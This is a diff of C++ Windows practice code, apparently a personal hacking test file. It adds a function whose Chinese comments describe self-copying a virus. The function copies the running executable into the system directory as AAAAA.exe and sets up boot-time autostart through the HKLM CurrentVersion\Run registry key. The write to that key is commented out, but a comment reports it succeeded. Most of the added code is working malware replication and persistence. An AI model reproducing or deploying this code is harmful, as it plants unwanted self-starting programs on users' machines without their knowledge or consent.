@@ -239,7 +239,7 @@ namespace space_test_hook {
 		DWORD dwSize;
 
 		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 0, KEY_READ, &hKey);
-		
+
 
 		DWORD dwCpuSpeed = 0;
 		dwType = REG_DWORD;
@@ -251,7 +251,7 @@ namespace space_test_hook {
 		dwSize = sizeof(sProcessorName);
 		lRet = RegQueryValueEx(hKey, ("ProcessorNameString"), NULL, &dwType, sProcessorName, &dwSize);
 
-		RegCloseKey(hKey);
+		lRet = RegCloseKey(hKey);
 
 		printf("");
 	}
@@ -281,7 +281,7 @@ namespace space_test_hook {
 
 		} while (true);
 
-		RegCloseKey(hKey);
+		lRet = RegCloseKey(hKey);
 
 		printf("\n total = %d", dwIndex);
 	}
@@ -316,6 +316,71 @@ namespace space_test_hook {
 		printf("");
 	}
 
+	void test9()
+	{
+		char system[MAX_PATH];
+		char pathtofile[MAX_PATH];
+		HMODULE GetModH = GetModuleHandle(NULL);
+		//得到当前执行文件的全路径
+		GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
+		//得到系统文件所在目录的路径，如c:\windows\system32
+		GetSystemDirectory(system, sizeof(system));
+		//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
+		strcat(system,"\\AAAAA.exe");
+
+
+		//自我复制到目标路径
+		//LPTSTR lpCommandLine = "C:\\AAAAA.exe";
+		LPTSTR lpCommandLine = system;
+		BOOL bRet = CopyFile(pathtofile, system, false);
+
+		//QA 复制到系统文件夹找不到对应文件，  但是用代码打开运行 或谷歌浏览器打开上层目录可以找到？ 会被复制到"C:\Windows\SysWOW64"文件夹下
+
+		int nRet;
+
+		if(bRet)
+		{
+			STARTUPINFO si;
+			memset(&si,0,sizeof(si));
+			si.cb=sizeof(si);
+			PROCESS_INFORMATION pi;
+
+			if(false)
+			{
+				nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS|CREATE_NEW_CONSOLE,   NULL,   NULL,   &si,   &pi);
+			}
+			else
+			{
+				//写入注册表，以便开机自动运行
+				HKEY hKey;
+				LSTATUS lSta;
+
+// 				lSta = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
+// 				lSta = RegSetValueEx(hKey, "Writing to the Registry Example", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
+
+				BYTE sProcessorName[MAX_PATH];
+				DWORD dwType = REG_SZ;
+				DWORD dwSize = sizeof(sProcessorName);
+				lSta = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_READ, &hKey);
+				lSta = RegQueryValueEx(hKey, ("Writing to the Registry Example"), NULL, &dwType, sProcessorName, &dwSize);
+
+				lSta = RegCloseKey(hKey);
+				printf("");
+
+				//QA: 写入注册表成功， 也能开机启动，但是注册表上找不到对应值
+			}
+
+			
+			printf("");
+		}
+
+		
+
+
+
+		printf("");
+	}
+
 }
 
 void test_hacker()
@@ -327,7 +392,8 @@ void test_hacker()
 	//space_test_hook::test5();
 	//space_test_hook::test6();
 	//space_test_hook::test7();
-	space_test_hook::test8();
+	//space_test_hook::test8();
+	space_test_hook::test9();
 
 	getchar();
 }
